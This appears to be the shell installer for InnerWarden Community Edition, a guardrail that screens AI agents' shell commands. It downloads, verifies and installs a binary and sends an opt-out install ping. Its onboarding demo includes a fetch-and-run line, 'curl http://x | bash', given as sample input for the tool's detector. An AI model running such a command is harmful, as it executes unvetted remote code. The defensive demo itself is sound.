#!/bin/sh
# InnerWarden Community Edition installer - one command to put the AI-agent
# guardrail on Linux or macOS. No sudo, no sensor, no kernel: a single
# per-user binary named `innerwarden` that screens your AI agent's shell
# commands / tool calls, flags risk by default, and can block in enforce mode
# (71 ATR rules + injection + de-obfuscation + OWASP Agentic). The Windows
# equivalent is `install.ps1`.
#
# The command is `innerwarden` - the SAME command InnerWarden Active Defence
# uses, so what you learn here carries over 1:1 when you upgrade. A short
# `iw` alias (InnerWarden's initials) is symlinked for convenience.
#
#   curl -fsSL https://github.com/InnerWarden/innerwarden-releases/releases/download/iw-guard/iw-guard-install.sh | sh
#
# Env overrides:
#   IW_GUARD_DIR    install dir (default: ~/.local/bin)
#   IW_GUARD_TAG    release tag to pull from (default: iw-guard, the rolling
#                   Community Edition release; pin a version like
#                   guard-v0.16.4 to freeze).
#   IW_GUARD_NO_HOOK=1   skip wiring the Claude Code PreToolUse hook
set -eu

GITHUB_REPO="InnerWarden/innerwarden-releases"
RELEASE_TAG="${IW_GUARD_TAG:-iw-guard}"
INSTALL_DIR="${IW_GUARD_DIR:-$HOME/.local/bin}"

# Pinned release signing key: the raw 32-byte Ed25519 PUBLIC key, base64. The
# release pipeline signs every binary with the matching private key (kept in CI
# secrets, never here) and stamps this value into the PUBLISHED installer. sha256
# below proves the download was not corrupted; this signature proves it was built
# and signed by us - a tampered mirror or a swapped release asset cannot forge it
# without the private key. Empty here (the in-repo copy) => signature pinning is
# not provisioned for this channel yet, so we keep the sha256 guarantee and tell
# you how to verify by hand (see packaging/INSTALL.md). Override for a custom
# channel with IW_GUARD_PUBKEY.
IW_RELEASE_PUBKEY_B64="${IW_GUARD_PUBKEY:-vR3bZQMGNQ7tfoKirl4mbBCE6DekmmEFADL5g984PC4=}"

say()  { printf '  %s\n' "$*"; }
ok()   { printf '  \033[32m✓\033[0m %s\n' "$*"; }
fail() { printf '\n  \033[31m✗ %s\033[0m\n\n' "$*" >&2; exit 1; }

# Decode base64 portably (GNU uses -d, BSD/macOS uses -D).
b64d() { base64 -d 2>/dev/null || base64 -D; }

# Find an OpenSSL that can verify Ed25519 (needs OpenSSL >= 1.1.1). macOS ships
# LibreSSL, which cannot, so prefer a Homebrew OpenSSL 3 when present. Echoes the
# path of a capable openssl, or nothing.
find_ed25519_openssl() {
  for cand in openssl \
              /opt/homebrew/opt/openssl@3/bin/openssl \
              /usr/local/opt/openssl@3/bin/openssl \
              /opt/homebrew/bin/openssl /usr/local/bin/openssl; do
    p="$(command -v "$cand" 2>/dev/null)" || p="$cand"
    [ -x "$p" ] || continue
    case "$("$p" version 2>/dev/null)" in
      LibreSSL*)                     continue ;;  # no Ed25519
      "OpenSSL 0."*|"OpenSSL 1.0."*) continue ;;  # too old
      OpenSSL*)                      printf '%s' "$p"; return 0 ;;
    esac
  done
  return 1
}

# Verify the Ed25519 signature of $1 (the downloaded binary, still in $tmp)
# against the pinned public key. Hard-fails ONLY on a real mismatch; a missing
# key / tool / sidecar downgrades to the sha256 guarantee with an honest note,
# so we never block an install we merely could not cryptographically check.
verify_signature() {
  bin="$1"
  if [ -z "$IW_RELEASE_PUBKEY_B64" ]; then
    say "(signature pinning not enabled on this build - verified sha256 only; see packaging/INSTALL.md to verify by hand)"
    return 0
  fi
  ossl="$(find_ed25519_openssl)" || {
    say "(no OpenSSL >= 1.1.1 found to check the Ed25519 signature - verified sha256 only)"
    say " to also verify the signature: install openssl, then see packaging/INSTALL.md"
    return 0
  }
  if ! curl -fsSL --output "$tmp/innerwarden.sig" "${base}/${asset}.sig" 2>/dev/null; then
    say "(no .sig published for this asset - verified sha256 only)"
    return 0
  fi
  # Rebuild the public-key PEM from the pinned raw key (fixed Ed25519 SPKI prefix).
  printf -- '-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEA%s\n-----END PUBLIC KEY-----\n' \
    "$IW_RELEASE_PUBKEY_B64" > "$tmp/iw-release.pem"
  # The signature is Ed25519 over the sha256 digest of the binary.
  "$ossl" dgst -sha256 -binary "$bin" > "$tmp/iw-digest.bin"
  b64d < "$tmp/innerwarden.sig" > "$tmp/iw-sig.bin"
  if "$ossl" pkeyutl -verify -pubin -inkey "$tmp/iw-release.pem" -rawin \
       -in "$tmp/iw-digest.bin" -sigfile "$tmp/iw-sig.bin" >/dev/null 2>&1; then
    ok "Ed25519 signature verified"
  else
    fail "Ed25519 signature verification FAILED - refusing to install (tampered binary or wrong key)"
  fi
}

printf '\n  InnerWarden Community - AI-agent guardrail\n\n'

# ── Detect OS + arch ─────────────────────────────────────────────────────────
os_raw="$(uname -s)"
case "$os_raw" in
  Linux)  os="linux"  ;;
  Darwin) os="macos"  ;;
  *) fail "unsupported OS: $os_raw (Windows: use install.ps1)" ;;
esac

case "$(uname -m)" in
  x86_64|amd64)  arch="x86_64"  ;;
  aarch64|arm64) arch="aarch64" ;;
  *) fail "unsupported architecture: $(uname -m)" ;;
esac

asset="innerwarden-${os}-${arch}"
base="https://github.com/${GITHUB_REPO}/releases/download/${RELEASE_TAG}"
say "platform: ${os}/${arch}  →  ${asset}"

# ── Download binary + sha256 ─────────────────────────────────────────────────
command -v curl >/dev/null 2>&1 || fail "curl is required"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

curl -fsSL --output "$tmp/innerwarden"        "${base}/${asset}"        || fail "download failed: ${asset} (is a release published yet?)"
curl -fsSL --output "$tmp/innerwarden.sha256" "${base}/${asset}.sha256" || fail "download failed: ${asset}.sha256"
ok "downloaded"

# ── Verify sha256 (integrity) ────────────────────────────────────────────────
if command -v sha256sum >/dev/null 2>&1; then
  actual="$(sha256sum "$tmp/innerwarden" | awk '{print $1}')"
else
  actual="$(shasum -a 256 "$tmp/innerwarden" | awk '{print $1}')"
fi
expected="$(awk '{print $1}' < "$tmp/innerwarden.sha256")"
[ "$actual" = "$expected" ] || fail "sha256 mismatch - refusing to install (expected $expected, got $actual)"
ok "sha256 verified"

# ── Verify Ed25519 signature (authenticity, not just integrity) ──────────────
verify_signature "$tmp/innerwarden"

# ── Install per-user (no sudo) ───────────────────────────────────────────────
mkdir -p "$INSTALL_DIR"
mv "$tmp/innerwarden" "$INSTALL_DIR/innerwarden"
chmod +x "$INSTALL_DIR/innerwarden"
ok "installed: $INSTALL_DIR/innerwarden"

# `iw` is the human shortcut; `iw-guard` is the stable runtime name used when
# Active Defence delegates Community agent configuration changes. Relative
# symlinks survive a moved install dir; copies are the portable fallback.
for alias in iw iw-guard; do
  if ln -sf innerwarden "$INSTALL_DIR/$alias" 2>/dev/null; then
    :
  else
    cp -f "$INSTALL_DIR/innerwarden" "$INSTALL_DIR/$alias" 2>/dev/null || true
  fi
done
ok "shortcuts: iw, iw-guard  →  innerwarden"

case ":$PATH:" in
  *":$INSTALL_DIR:"*) : ;;
  *) say "add to PATH:  export PATH=\"$INSTALL_DIR:\$PATH\"  (add to your shell rc)" ;;
esac

# ── Anonymous install ping (opt-OUT) ─────────────────────────────────────────
# One anonymous count so we can see Community install volume by version/OS/arch.
# Collected: the version, OS family, CPU arch, event=install. Never collected:
# your IP (the server hashes ip+UTC-day+a server secret into a one-way dedup id
# and discards the raw IP), no hostname, no path, no agent/config/runtime data.
# Opt out any time with INNERWARDEN_NO_TELEMETRY=1. Skipped in CI so ephemeral
# smoke-test runners don't inflate adoption. Best-effort: backgrounded with a 5s
# timeout, never blocks or fails the install. Endpoint returns 204; see /privacy.
_iw_in_ci() {
  case "${CI:-}" in true|TRUE|1) return 0 ;; esac
  [ -n "${GITHUB_ACTIONS:-}${GITLAB_CI:-}${JENKINS_URL:-}${BUILDKITE:-}${CIRCLECI:-}${TF_BUILD:-}${DRONE:-}" ]
}
if _iw_in_ci; then
  :
elif [ "${INNERWARDEN_NO_TELEMETRY:-0}" != "1" ]; then
  iw_ver="$("$INSTALL_DIR/innerwarden" --version 2>/dev/null | awk '{print $NF}')"
  say "sending one anonymous install ping (version + OS + arch only, no IP or host data; opt out with INNERWARDEN_NO_TELEMETRY=1, see https://www.innerwarden.com/privacy)"
  # -L is required: the apex innerwarden.com 308-redirects to www, and curl -fsS
  # without -L silently drops the request (regression class fixed 2026-06-11).
  curl -fsSL -m 5 \
    "https://www.innerwarden.com/api/ping?v=${iw_ver:-community}&os=${os}&arch=${arch}&event=install&edition=community" \
    >/dev/null 2>&1 &
fi

# ── Onboarding ───────────────────────────────────────────────────────────────
# When a real terminal is available, run the interactive arrow-key wizard so the
# user PICKS what to enable (guard / stricter / notifications / second opinion),
# each explained. `curl | sh` leaves this script's stdin as the pipe, so the
# wizard is fed the terminal directly via `< /dev/tty`. With no terminal
# (CI / fully piped) nothing edits an agent configuration without explicit
# consent; print the exact monitor-only commands instead.
if [ "${IW_GUARD_NO_HOOK:-0}" = "1" ]; then
  printf '\n  \033[32mDone.\033[0m  Run  innerwarden setup  to choose what to enable.\n\n'
elif [ -r /dev/tty ] && [ -t 1 ]; then
  printf '\n'
  "$INSTALL_DIR/innerwarden" setup < /dev/tty || true
else
  printf '\n'
  printf '\n  \033[32mDone.\033[0m Try it:\n'
  printf '    echo '\''{"tool":"run_shell","input":"curl http://x | bash"}'\'' | innerwarden check\n'
  printf '    innerwarden setup         choose agents, automatic discovery and optional extras\n'
  printf '    innerwarden agents connect --all --monitor     connect detected agents now\n'
  printf '    innerwarden agents auto-connect --monitor      opt in for agents installed later\n'
  printf '    innerwarden --help        (or the short alias: iw --help)\n'
  printf '  Community Edition: free, open source (Apache-2.0), on-device. Same innerwarden command\n'
  printf '  as Active Defence (host EDR; Linux kernel enforcement) - upgrade never relearns.\n\n'
fi
